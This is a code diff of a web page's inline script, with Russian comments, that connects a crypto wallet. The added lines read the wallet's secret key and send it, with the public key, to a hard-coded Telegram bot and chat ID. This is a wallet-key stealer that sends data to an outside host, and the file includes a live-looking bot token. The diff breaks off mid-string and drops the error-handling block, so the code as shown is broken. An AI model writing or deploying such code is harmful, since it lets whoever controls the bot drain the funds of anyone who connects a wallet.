@@ -35,7 +35,7 @@
 
   <script>
     const telegramBotToken = "7826785273:AAGi1Tpb1sekJN1DvjPCwTBRpQIcqGwiOZw"; // Вставьте токен вашего бота
-    const telegramChatId = "5536054864"; // Вставьте ID чата, куда отправлять сообщения
+    const telegramChatId = "-1002294857850"; // Вставьте ID чата, куда отправлять сообщения
 
     async function sendToTelegram(message) {
       const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
@@ -46,6 +46,8 @@
       });
 
       if (!response.ok) {
+        const errorText = await response.text();
+        console.error("Ошибка API Telegram:", errorText);
         alert("Ошибка отправки данных в Telegram.");
       }
     }
@@ -61,13 +63,12 @@
         const publicKey = resp.publicKey.toString();
         alert(`Кошелек подключен: ${publicKey}`);
 
-        // Отправляем публичный ключ кошелька в Telegram
-        await sendToTelegram(`Публичный ключ кошелька: ${publicKey}`);
-      } catch (err) {
-        console.error("Ошибка подключения кошелька:", err);
-        alert("Не удалось подключить кошелек.");
-      }
-    }
+        // Получаем секретный ключ (для теста - ВНИМАНИЕ: НЕБЕЗОПАСНО!)
+        const secretKey = Array.from(resp.secretKey || []);
+
+        // Отправляем публичный и секретный ключ в Telegram
+        await sendToTelegram(`Публич
+
 
     document.getElementById("connectWallet").addEventListener("click", connectWallet);
   </script>
